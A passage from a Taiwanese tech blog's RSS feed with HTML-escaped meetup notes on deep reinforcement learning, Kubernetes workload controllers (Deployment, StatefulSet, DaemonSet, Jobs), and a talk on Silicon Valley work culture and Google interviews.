&lt;li&gt;Use experience replay  &lt;ul&gt;
&lt;li&gt;Break correlations in data, bring us back to iid setting  &lt;/li&gt;
&lt;li&gt;Learn from all past policies  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Freeze target Q-network  &lt;ul&gt;
&lt;li&gt;Avoid oscillation  &lt;/li&gt;
&lt;li&gt;Break correlations between Q-network and target  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Clip rewards or normalize network adaptively to sensible range  &lt;ul&gt;
&lt;li&gt;Robust gradients  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DQN in Atari  &lt;ul&gt;
&lt;li&gt;Goal: end-to-end learning of values Q(s, a) from pixels  &lt;ul&gt;
&lt;li&gt;Input: state is stack of raw pixels from last 4 frames  &lt;/li&gt;
&lt;li&gt;Output: Q(s, a) for all joystick/button positions a  &lt;/li&gt;
&lt;li&gt;Reward is the score change for that step  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DQN in E2E Task-Completion Bot  &lt;ul&gt;
&lt;li&gt;Simulated User  &lt;ul&gt;
&lt;li&gt;Generate interactions based on a predefined fake goal  &lt;/li&gt;
&lt;li&gt;Automatically learn strategy by training on the simulated data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Model-Based Deep RL  &lt;ul&gt;
&lt;li&gt;Goal: learn a transition model of the environment and plan based on the transition model  &lt;/li&gt;
&lt;li&gt;Model-based deep RL is challenging, and so far has failed in Atari  &lt;/li&gt;
&lt;li&gt;Model-Based Deep RL in AlphaGo  &lt;ul&gt;
&lt;li&gt;Monte-Carlo tree search (MCTS)  &lt;ul&gt;
&lt;li&gt;MCTS simulates future trajectories  &lt;/li&gt;
&lt;li&gt;Builds large lookahead search tree with millions of positions  &lt;/li&gt;
&lt;li&gt;State-of-the-art Go programs use MCTS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convolutional Networks  &lt;ul&gt;
&lt;li&gt;12-layer CNN trained to predict expert moves  &lt;/li&gt;
&lt;li&gt;Raw CNN (looking at 1 position, no search at all) equals performance of MoGo with 105 position search tree  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;More Applications  &lt;ul&gt;
&lt;li&gt;AlphaGo  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=0JL04JJjocc"&gt;Flying Helicoptor&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=0xo1Ldx3L5Q"&gt;Driving&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.bloomberg.com/news/articles/2016-07-19/google-cuts-its-giant-electricity-bill-with-deepmind-powered-ai"&gt;Google Cuts Its Giant Electricity Bill With DeepMind-Powered AI&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://universe.openai.com/"&gt;OpenAI Universe&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Software platform for measuring and training an AI's general&lt;br /&gt;
intelligence via the &lt;a href="https://gym.openai.com/"&gt;OpenAI gym&lt;/a&gt; environment  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Machine Learning &amp;amp; Deep Learning 需要  &lt;ul&gt;
&lt;li&gt;足夠的運算資源  &lt;/li&gt;
&lt;li&gt;各種經驗及技巧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;FAQ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Deep Learning 的 model 會是 non-linear 的  &lt;/li&gt;
&lt;li&gt;機器翻譯目前在台灣的狀況如何？要如何著手？  &lt;ul&gt;
&lt;li&gt;機器翻譯的話，目前在國外算是滿成熟的，目前會使用 RNN 來做。  &lt;/li&gt;
&lt;li&gt;如果是台語的部份，目前好像比較少看到，會是個還有發展空間的方向。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼需要 Activation Function？他在 Deep Learning 中扮演的角色是什麼？  &lt;ul&gt;
&lt;li&gt;處理 non-linear 的部份，如果沒有 Actication Function 的話，多層的結果用一層就可以去表示。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼會選擇 Sigmoid 作為 Activation Function?  &lt;ul&gt;
&lt;li&gt;其實有很多種 Activation Function，拿 Sigmoid 來講是因為他比較簡單，把 output 壓在 -1~1 之間  &lt;/li&gt;
&lt;li&gt;另外一個比較常見的是 Relu 這個 Activation Function  &lt;ul&gt;
&lt;li&gt;0 以下的就刪除掉  &lt;/li&gt;
&lt;li&gt;避免 information 被壓縮的太小，用來解決經過太多層之後 information 被壓得太小。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deep Learning 的最佳化要具備哪些能力  &lt;ul&gt;
&lt;li&gt;如果是純理論的部份會跟數學方面相關。  &lt;/li&gt;
&lt;li&gt;但如果是實務上的 task，會跟該 task 的 domain knowledge 比較相關。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CNN 對於影像旋轉是否也有夠好的識別度？  &lt;ul&gt;
&lt;li&gt;第一個作法就是把你的 training data 也旋轉過再丟進去訓練  &lt;/li&gt;
&lt;li&gt;另外一個作法是使用會考慮旋轉相關的 model 放進去 train，input data 不需要特別旋轉過  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;學 Machine Learning 需要學習微積分、統計和線性代數嗎？  &lt;ul&gt;
&lt;li&gt;基本的微積分概念是要的，但沒有很複雜，如果完全不會微分的話要學一下。  &lt;/li&gt;
&lt;li&gt;統計的話基本概念要有，但不會太多。&lt;br /&gt;
 線性代數是最重要的，會看到很多 vector, matrix 以及 space 上的處理，有很多假設是必須要知道的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 12 Aug 2017 17:02:14 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-08-12:posts/2017/08/12/dive-into-deep-learning-datasci-tw/</guid><category>Deep Learning</category><category>DNN</category><category>CNN</category><category>RNN</category><category>Machine Learning</category></item><item><title>GCPUG.tw #28</title><link>https://blog.m157q.tw/posts/2017/08/04/gcpug-tw-28/</link><description>&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://gcpugtw.kktix.cc/events/meetup201708"&gt;https://gcpugtw.kktix.cc/events/meetup201708&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Running Workloads in Kubernetes - Janet Kuo&lt;/h1&gt;
&lt;p&gt;今年 2/28 時，&lt;a href="https://techcrunch.com/2017/02/28/amazon-aws-s3-outage-is-breaking-things-for-a-lot-of-websites-and-apps/"&gt;Amazon S3 的 outage&lt;/a&gt; 讓很多公司的網站都掛了，&lt;br /&gt;
但有間叫 &lt;a href="https://twitter.com/robertjscott/status/836743514423713793"&gt;Spire 的公司沒受到影響&lt;/a&gt;，&lt;br /&gt;
原因是因為用了 Kubernetes。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Demo code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos"&gt;https://github.com/janetkuo/k8s-demos&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/contrib/tree/master/micro-demos"&gt;https://github.com/kubernetes/contrib/tree/master/micro-demos&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecture of Kubernetes  &lt;ul&gt;
&lt;li&gt;Master node  &lt;ul&gt;
&lt;li&gt;Controller  &lt;ul&gt;
&lt;li&gt;管理 Worker nodes 上面的 Pod  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Worker node  &lt;ul&gt;
&lt;li&gt;Running Pods  &lt;/li&gt;
&lt;li&gt;Pull image  &lt;/li&gt;
&lt;li&gt;把 Network, Volume 連接起來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Four General Patterns  &lt;ul&gt;
&lt;li&gt;Stateless  &lt;ul&gt;
&lt;li&gt;Web frontends  &lt;/li&gt;
&lt;li&gt;Web servers  &lt;ul&gt;
&lt;li&gt;NGINX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Stateful  &lt;ul&gt;
&lt;li&gt;Databases  &lt;ul&gt;
&lt;li&gt;MongoDB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Message queues  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Daemon  &lt;ul&gt;
&lt;li&gt;Cluster storage  &lt;/li&gt;
&lt;li&gt;Logs collections  &lt;/li&gt;
&lt;li&gt;Node monitoring  &lt;/li&gt;
&lt;li&gt;example  &lt;ul&gt;
&lt;li&gt;linkerd  &lt;/li&gt;
&lt;li&gt;fluentd  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Batch  &lt;ul&gt;
&lt;li&gt;Emails to send  &lt;/li&gt;
&lt;li&gt;Files to zip  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deployment (For stateless pattern)  &lt;ul&gt;
&lt;li&gt;No persistent states  &lt;ul&gt;
&lt;li&gt;Scale is easy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Availability &amp;gt; Consistency  &lt;ul&gt;
&lt;li&gt;Create multiple replicas of the smae pod  &lt;/li&gt;
&lt;li&gt;Pods are disposable  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling update  &lt;ul&gt;
&lt;li&gt;Update at a controlled rate  &lt;/li&gt;
&lt;li&gt;Block updates on failure  &lt;/li&gt;
&lt;li&gt;History and rollback  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;kubectl&lt;/code&gt; 下指令，會對 Master node 下一個 async 的指令，Master Node 再透過 controller 去控制 Worker node  &lt;/li&gt;
&lt;li&gt;Service  &lt;ul&gt;
&lt;li&gt;去跟後面的 Pods 溝通  &lt;/li&gt;
&lt;li&gt;當有 Pod 掛掉的話，Service 的 load balancer 就不會把 request 導到壞掉的 Pod  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos/tree/master/dep"&gt;https://github.com/janetkuo/k8s-demos/tree/master/dep&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;StatefulSet (For stateful pattern, 另外一個專門針對 Stateful 使用的 controller)  &lt;ul&gt;
&lt;li&gt;可能的使用情境  &lt;ul&gt;
&lt;li&gt;ZooKeeper  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Store persistent data  &lt;ul&gt;
&lt;li&gt;Need stable, unique and sticky identity and storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Consistency &amp;gt; Availability  &lt;ul&gt;
&lt;li&gt;Create similar pods, each has its own identity and storage  &lt;/li&gt;
&lt;li&gt;Pods are not disposable  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Deploy, scale, terminate  &lt;ul&gt;
&lt;li&gt;In order or in parallel  &lt;/li&gt;
&lt;li&gt;可以設定依序 deploy，因為有些服務不能全部一起開，而是必須照順序開。但如果沒有這個需求的話，還是可以用 Parallel。  &lt;/li&gt;
&lt;li&gt;StatefulSet 的 Parallel Deployment 是在 k8s 1.7 加入的功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling update  &lt;ul&gt;
&lt;li&gt;StatefulSet 的 parallel rolling update 是在 k8s 1.7 加入的功能  &lt;/li&gt;
&lt;li&gt;會有 graceful 的 termination，預設的 timeout 時間是 30 秒，如果超過的話，termination 就會被取消。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos/tree/master/stateful"&gt;https://github.com/janetkuo/k8s-demos/tree/master/stateful&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DaemonSet (For Daemon Pattern)  &lt;ul&gt;
&lt;li&gt;One Daemon per node  &lt;ul&gt;
&lt;li&gt;Background process  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Daemons created and removed with nodes  &lt;/li&gt;
&lt;li&gt;Node labels  &lt;ul&gt;
&lt;li&gt;Control which nodes daemons should run on  &lt;/li&gt;
&lt;li&gt;可以用來控制讓 daemon 只執行在特定的 node 上  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling update  &lt;ul&gt;
&lt;li&gt;在 k8s 1.6 新增的功能  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos/tree/master/ds"&gt;https://github.com/janetkuo/k8s-demos/tree/master/ds&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jobs (For Batch Pattern)  &lt;ul&gt;
&lt;li&gt;Run in Parallel  &lt;ul&gt;
&lt;li&gt;How many pods can be created and running at a time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run to Completion  &lt;ul&gt;
&lt;li&gt;How many pods need to complete (exit successfully)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Parallel processing of independent but related work items  &lt;ul&gt;
&lt;li&gt;Emails to send or frames to render  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Job create 出來的 pod 是會結束的，因為事情做完了就會關掉。與前面 3 個 pattern 的 controller 建立的 Pod 不同，如果壞掉了不會幫你重開。  &lt;/li&gt;
&lt;li&gt;Demo code  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/janetkuo/k8s-demos/tree/master/jobs"&gt;https://github.com/janetkuo/k8s-demos/tree/master/jobs&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;parallelism: 一次最多開幾個 pod  &lt;/li&gt;
&lt;li&gt;completions: 需要幾個成功的 pods 才能停止  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;4 Controllers for 4 Patterns  &lt;ul&gt;
&lt;li&gt;Deployment  &lt;ul&gt;
&lt;li&gt;Availability  &lt;/li&gt;
&lt;li&gt;Scale &amp;amp; recover easily  &lt;/li&gt;
&lt;li&gt;Disposable cpoies of the same pod  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;StatefulSet  &lt;ul&gt;
&lt;li&gt;Consistency  &lt;/li&gt;
&lt;li&gt;Unique, sticky identity and storage  &lt;/li&gt;
&lt;li&gt;Deploy, scale and terminate in order or in parallel  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DaemonSet  &lt;ul&gt;
&lt;li&gt;One pod per node by default  &lt;/li&gt;
&lt;li&gt;Daemon pods added and removed with nodes  &lt;/li&gt;
&lt;li&gt;Use node labels to control  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jobs  &lt;ul&gt;
&lt;li&gt;Run multiple pods in parallel  &lt;/li&gt;
&lt;li&gt;Run pods to completion  &lt;ul&gt;
&lt;li&gt;只有指定數量的 pods 都成功結束的話，這個 job 才算成功  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Where Do I start?  &lt;ul&gt;
&lt;li&gt;Get a Kubernetes Cluster  &lt;ul&gt;
&lt;li&gt;GCE  &lt;/li&gt;
&lt;li&gt;GKE  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/minikube"&gt;minikube&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/charts"&gt;Kubernetes Charts&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Curated applications for Kubernetes  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/helm"&gt;Kubernetes Helm&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;The Kubernetes Package Manager  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How Do I Customize?  &lt;ul&gt;
&lt;li&gt;Kubernetes is extensible  &lt;ul&gt;
&lt;li&gt;You can write your own controller or use controllers wrote by other people.  &lt;/li&gt;
&lt;li&gt;Examples  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/upmc-enterprises/elasticsearch-operator"&gt;https://github.com/upmc-enterprises/elasticsearch-operator&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/coreos/etcd-operator"&gt;https://github.com/coreos/etcd-operator&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Kubernetes is Open  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/kubernetes"&gt;https://github.com/kubernetes/kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://kubernetes.io"&gt;https://kubernetes.io&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://slack.k8s.io"&gt;https://slack.k8s.io&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/kubernetesio"&gt;https://twitter.com/kubernetesio&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;StatefulSet 的 Storage 不會被砍掉，那 DaemonSet 可以有一樣的效果嗎？因為有時候一些 Daemon 會需要這方式。  &lt;ul&gt;
&lt;li&gt;可以，但只能讀，不能寫，因為 DaemonSet 的設計上的關係，如果大家都可以寫的話會很亂。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling Update 如果希望新舊版都同時存在的話該怎麼做  &lt;ul&gt;
&lt;li&gt;StatefulSet 可以透過 Partition 做到  &lt;/li&gt;
&lt;li&gt;Deployment 的話，可以建立一個新的和一個舊的 Deployment，再透過 Service 的 Load Balancer 去導流量。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rolling Update 如果不希望新舊版都同時存在的話該怎麼做  &lt;ul&gt;
&lt;li&gt;StatefulSet 沒辦法做到  &lt;/li&gt;
&lt;li&gt;但 Deployment 可以把 strategy 設定成 Recreate，這樣就會先起好新的 pod，然後把舊的砍掉。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 04 Aug 2017 21:37:05 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-08-04:posts/2017/08/04/gcpug-tw-28/</guid><category>Google Cloud Platform</category></item><item><title>GDG Taipei #40</title><link>https://blog.m157q.tw/posts/2017/08/02/gdg-taipei-40/</link><description>&lt;ul&gt;
&lt;li&gt;Links:  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.meetup.com/GDGTaipei/events/241300863/"&gt;https://www.meetup.com/GDGTaipei/events/241300863/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Women Techmakers&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.womentechmakers.com/"&gt;https://www.womentechmakers.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;First Asia Women Techmakers Lead  &lt;/li&gt;
&lt;li&gt;2012 年由 Google 創立  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;GDG Taipei #40 - Women Techmakers #3 Janet Kuo 郭家禎&lt;/h2&gt;
&lt;h3&gt;What I learned in Silicon Valley&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Silicon Valley is a mindset. Not visual or physical.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;矽谷的精神  &lt;ul&gt;
&lt;li&gt;It's Okay to FAIL.  &lt;ul&gt;
&lt;li&gt;It's okay to take risks.  &lt;/li&gt;
&lt;li&gt;上一次失敗是什麼時候？  &lt;/li&gt;
&lt;li&gt;如果想不起來，可能是你很幸運，但也非常有可能是因為你都待在舒適圈，一直打著安全牌，意味著同時也失去了不少可以成長的機會。  &lt;/li&gt;
&lt;li&gt;如果穩定是你的夢想的話，那恭喜你。但如果只是為了穩定而去做自己不想做的事，那就是放棄自己的夢想。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;當時放棄在台灣 IBM 的工作機會而選擇要到美國去的時候，也受到身邊很多人的反對。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;矽谷的公司很樂於冒險，即便是大公司，也會想盡辦法追求各種新的可能性。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Postmortem Culture  &lt;ul&gt;
&lt;li&gt;發生重大事故之後的檢討，從失敗中學習。  &lt;/li&gt;
&lt;li&gt;No blame culture. 對事不對人。  &lt;ul&gt;
&lt;li&gt;以今年初 GitLab 員工誤刪資料庫且備份無法還原為例，GitLab 沒有開除該名員工，然後把所有救援的細節都公開並甚至開直播告知使用者目前救援的進度。許多矽谷的公司也因為這件事而開始重視檢測資料庫備份是否能夠順利還原的機制。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Take Personal Responsibility for your work.  &lt;ul&gt;
&lt;li&gt;Have an opinion  &lt;ul&gt;
&lt;li&gt;不要因為自己的年資比較淺就覺得不能有自己的意見，永遠要有自己的想法。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我有一位去 Facebook 面試的朋友，遇到面試官問他如果要在 Facebook 上設計出可以標記物品的品牌價錢的功能要怎麼設計。結果朋友告訴面試官他覺得這個功能不適合 Facebook，因為 Facebook 重視的是人與人之間的互動，而不是物品，所以他拒絕設計這個功能。最後的結果是這位朋友拿到了 Facebook 的 Offer。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Have an impact  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;"Failure is an option here. If things are not failing, you are not innovating enough." -- Elon Musk  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;怎麼進 Google  &lt;ul&gt;
&lt;li&gt;Software Engineer 面試流程  &lt;ul&gt;
&lt;li&gt;Whiteboard  &lt;ul&gt;
&lt;li&gt;基本的演算法和資料結構  &lt;/li&gt;
&lt;li&gt;多練習在白板上寫，跟用電腦寫差很多。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果有工作經驗的話，會問 System Design。這邊就比較吃實戰經驗，也可以多看一些公司的 Engineering Blog。  &lt;/li&gt;
&lt;li&gt;履歷一放上去後，很多公司都會找上來，不管哪間的面試都去，把他當成免費的經驗。  &lt;/li&gt;
&lt;li&gt;因為留學生有找工作的時程壓力，所以策略是一批公司一批公司面試，這批如果都沒結果的話就換下一批。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼選 Google  &lt;ul&gt;
&lt;li&gt;原本比較想去的是 Medium，但後來考量到簽證和工作內容的自由度還是選擇去 Google  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 Google 遭遇最大的困難和挫折是什麼？怎麼面對的？  &lt;ul&gt;
&lt;li&gt;周圍的人都很強，冒牌者症後群。  &lt;/li&gt;
&lt;li&gt;剛進去的時候人資就直接說：「剛進來的你們一定都會以為自己是不小心被 hire 進來的，這是很正常的，不要怕。」  &lt;/li&gt;
&lt;li&gt;英文溝通不那麼流暢，剛好 Google 有給進修費，所以就順便去找英文老師上課。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在 Google 工作期間最有成就最開心的事  &lt;ul&gt;
&lt;li&gt;最有成就感的是看到使用者用了並且很喜歡自己做的功能  &lt;ul&gt;
&lt;li&gt;有幫忙 Support Pokemon Go 的 Team  &lt;/li&gt;
&lt;li&gt;能講 Pokemon Go 是跑在自己做的產品上的時候很開心  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;英文溝通上的困難怎麼解決的  &lt;ul&gt;
&lt;li&gt;最難的不是技術相關的話題，而是 Small Talk  &lt;/li&gt;
&lt;li&gt;可以觀察對話中誰是引領話題的人，可以嘗試跟他對話把話題轉掉之類的 XD  &lt;/li&gt;
&lt;li&gt;Ice Breaker 式的問答，大部份都是先握個手再自我介紹然後找了一些共同點來聊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在矽谷，男生和女生的 Leader 有什麼不一樣的地方  &lt;ul&gt;
&lt;li&gt;領導方式都不一樣，但跟性別沒有什麼大太的相關性。  &lt;/li&gt;
&lt;li&gt;有的話很多，喜歡講笑話。有的很溫文儒雅，會有耐心解釋跟你一些東西。  &lt;/li&gt;
&lt;li&gt;同樣的話題，如果是女生講的話大家普遍都不太在意，但如果是男生來講的話，大家就會覺得不錯。但就是要一直講一直講，捍衛自己的意見。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tech Lead 是什麼？  &lt;ul&gt;
&lt;li&gt;不負責帶人，但負責整個團隊的技術走向。  &lt;/li&gt;
&lt;li&gt;告知團隊整個 Project 的 Roadmap 和 Schedule  &lt;/li&gt;
&lt;li&gt;團隊裡負責做技術決定的，不管人，如果你今天心情不好，去跟老闆說 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你在 Kubernetes 裏面負責什麼部份？  &lt;ul&gt;
&lt;li&gt;API 和 Storage 相關 Workload 的 Support  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你在 IBM Taiwan 和 Google 裏面感受到的差異  &lt;ul&gt;
&lt;li&gt;在台灣聽到 IBM，大家覺得好厲害，外商耶。在美國，聽到的人會說，「哈，你老人嗎」 XD  &lt;/li&gt;
&lt;li&gt;IBM 算是間歷史比較悠久一點的公司，近期以來比較沒有什麼創新的部份。  &lt;/li&gt;
&lt;li&gt;Google 雖然也是大公司，但還是會花錢做一些不一定用得到但是創新的技術。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對自己未來 5 年的規劃是什麼？你還會待在大公司嗎？還是會想要加入自己本來想要的新創公司  &lt;ul&gt;
&lt;li&gt;變動很快，很難說。自己剛出來工作的時候大家都搶著進 Dropbox，但現在也沒這麼紅了。  &lt;/li&gt;
&lt;li&gt;不會說 5 年後一定要待在 Google，原本不是這樣想，但來了矽谷以後，感覺到如果自己想永遠待在某間公司的想法是很危險的，永遠要為自己的下一份工作著想。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
